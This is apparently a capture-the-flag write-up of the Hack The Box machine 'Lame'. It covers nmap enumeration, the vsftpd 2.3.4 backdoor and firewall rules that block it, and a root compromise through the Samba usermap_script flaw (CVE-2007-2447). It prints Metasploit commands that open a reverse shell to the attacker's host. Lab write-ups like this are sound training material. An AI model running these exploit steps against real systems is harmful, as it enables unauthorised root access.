---
clayout: ctf
title: Lame
date: 2025-08-20
image: /ctf/hack-the-box/machines/lame/info-card.png
type: Hack The Box

ctf:
    - name: Lame
      link: https://app.hackthebox.com/machines/1
      thumbnail: /ctf/hack-the-box/machines/lame/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/1
          thumbnail: /ctf/hack-the-box/machines/lame/pwned.png
---

## Machine Overview

The target is a legacy Linux host exposing **FTP (vsftpd 2.3.4)**, **SSH (OpenSSH 4.7p1)**, and **Samba (3.0.20-Debian)**. While vsftpd 2.3.4 is the backdoored build that attempts to spawn a shell on **TCP/6200**, the host firewall prevents access: the **INPUT** chain policy is **DROP**, and only **21, 22, 139, 445** are explicitly allowed. The practical attack path is **Samba (CVE-2007-2447 / usermap\_script)**, which provides an immediate **root** shell without further privilege escalation.

## Enumeration

### Nmap Scan

We begin with a basic service and version scan:

```bash
nmap -sC -sV -A -oN nmap.txt 10.10.10.3
```

**Scan Results:**

```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

From the scan we see:

* FTP allows anonymous login.
* Samba is running a vulnerable version (3.0.20).
* SSH is available, but not immediately useful without credentials.

### FTP Enumeration

Anonymous FTP login is enabled, but the directory is empty:

```bash
ftp 10.10.10.3
Name: anonymous
Password: anonymous
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

The service identifies as **vsftpd 2.3.4**, which is notable because a trojanized build was briefly distributed in 2011.

* In that backdoored build, sending a username containing `:)` spawns a shell on **6200/tcp**.
* Metasploit’s `exploit/unix/ftp/vsftpd_234_backdoor` targets exactly that behavior.

On this host, the backdoor shell is **not externally reachable** due to the firewall configuration. The reasoning and evidence appear in [Firewall Analysis](#firewall-analysis-why-the-vsftpd-backdoor-fails). Let's move on to the Samba enumeration.

### Samba Enumeration

The more promising lead is **Samba 3.0.20-Debian**, which is affected by the **usermap script** vulnerability (CVE-2007-2447).
This flaw allows arbitrary command execution when username map scripts are improperly handled.

Searching in Metasploit, we find a matching exploit:

```bash
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
msf exploit(multi/samba/usermap_script) > set RPORT 445
msf exploit(multi/samba/usermap_script) > set LHOST 10.10.14.5
msf exploit(multi/samba/usermap_script) > set LPORT 4444
msf exploit(multi/samba/usermap_script) > run
```

Successful exploitation gives us a shell:

```bash
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] Command shell session 2 opened (10.10.14.5:4444 -> 10.10.10.3:47871)

id
uid=0(root) gid=0(root)
```

We immediately gain root-level access.

> [!NOTE] Root/User Flag
> The flags are in the following files:
>
> * User flag: `/home/makis/user.txt`.
> * Root flag: `/root/root.txt`.

## Firewall Analysis (why the vsftpd backdoor fails)

Post-exploitation inspection of the firewall clarifies the failed vsftpd route. The **filter/INPUT** chain policy is **DROP**, with explicit **ACCEPT** rules only for selected services: **21/tcp (FTP)**, **22/tcp (SSH)**, **139/445 (SMB over TCP/UDP)**, and **3632 (distcc)**. There is **no rule permitting 6200/tcp**, the port used by the vsftpd 2.3.4 backdoor. As a result, even if the backdoor logic is triggered, the shell on 6200 is not reachable externally. The UFW `*-before/after-*` rules using `RETURN` are part of chain flow control and do not themselves allow traffic; the actual allows appear under `ufw-user-input`.

```bash
$ iptables-save | head
:INPUT DROP [...]
# ... other rules ...
```

```bash
$ iptables-save | grep -E -- '--dport'
-A ufw-after-input -p udp -m udp --dport 137 -j RETURN
-A ufw-after-input -p udp -m udp --dport 138 -j RETURN
-A ufw-after-input -p tcp -m tcp --dport 139 -j RETURN
-A ufw-after-input -p tcp -m tcp --dport 445 -j RETURN
-A ufw-after-input -p udp -m udp --dport 67 -j RETURN
-A ufw-after-input -p udp -m udp --dport 68 -j RETURN
-A ufw-before-input -p udp -m udp --sport 67 --dport 68 -j ACCEPT
-A ufw-user-input -p tcp -m tcp --dport 22 -j ACCEPT
-A ufw-user-input -p udp -m udp --dport 22 -j ACCEPT
-A ufw-user-input -p tcp -m tcp --dport 21 -j ACCEPT
-A ufw-user-input -p tcp -m tcp --dport 3632 -j ACCEPT
-A ufw-user-input -p udp -m udp --dport 3632 -j ACCEPT
-A ufw-user-input -p tcp -m tcp --dport 139 -j ACCEPT
-A ufw-user-input -p udp -m udp --dport 139 -j ACCEPT
-A ufw-user-input -p tcp -m tcp --dport 445 -j ACCEPT
-A ufw-user-input -p udp -m udp --dport 445 -j ACCEPT
# (no rule for 6200/tcp)
```

This policy explains the discrepancy between the vulnerable version and the non-exploitable behavior observed during testing.
That’s why the exploit doesn’t work: it’s a **deliberate rabbit hole**.

## References

* [Hack The Box - Lame](https://app.hackthebox.com/machines/1)
* [Metasploit - vsftpd 2.3.4 backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
* [Metasploit - Samba Usermap Script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
